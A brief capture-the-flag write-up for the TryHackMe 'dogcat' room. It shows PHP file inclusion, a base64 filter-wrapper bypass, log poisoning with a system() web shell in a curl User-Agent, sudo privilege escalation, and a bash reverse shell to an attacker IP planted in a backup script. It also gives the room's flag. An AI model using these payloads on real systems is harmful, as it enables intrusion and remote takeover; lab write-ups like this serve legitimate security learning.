# dogcat tryhackme writeups

http://10.10.169.61/?view=dog
http://10.10.169.61/?view=cat



http://10.10.169.61/?view=../../dog.php
```
Warning: include(../../dog.php.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 24

Warning: include(): Failed opening '../../dog.php.php' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 24
```

filter bypass 
`php://filter/read=convert.base64-encode/resource=`


http://10.10.169.61/?view=php://filter/read=convert.base64-encode/resource=./dog/../../../../var/www/html/index

```
curl -i -v http://10.10.169.61/?view=./dog -A "<?php system('ls /');?>"
-i response
-v vervbose
-A user-agent
```

or  better `<?php system($_GET['cmd']); ?>`

amazing ctf dogcat, let's resume:

-php LFI
-bypass filter base64 wrapper
-log poisonning
-then

 I host a php-reverse shell on my machine, I downloaded it
on the box via curl after that I have a shell, I found the 1st
flag in the webdir, and the second one by seeing the dir before
to get into the main webdir, I mean /var/www/html, after the 3rd
I got it,by root the machine just exploit `env` binary with sudo priv
on gtfobins website, and the 4th flag I got it out of the box(container) by
setting a second shell, here the content of the file I used to get into the
container
```
echo "#!/bin/bash" > /opt/backups/backup.sh
echo "/bin/bash -c 'bash -i >& /dev/tcp/10.18.90.251/8889 0>&1'" >> /opt/backups/backup.sh
```
, this file, you can find it in opt dir. AND HERE THE FLAG
`THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}`
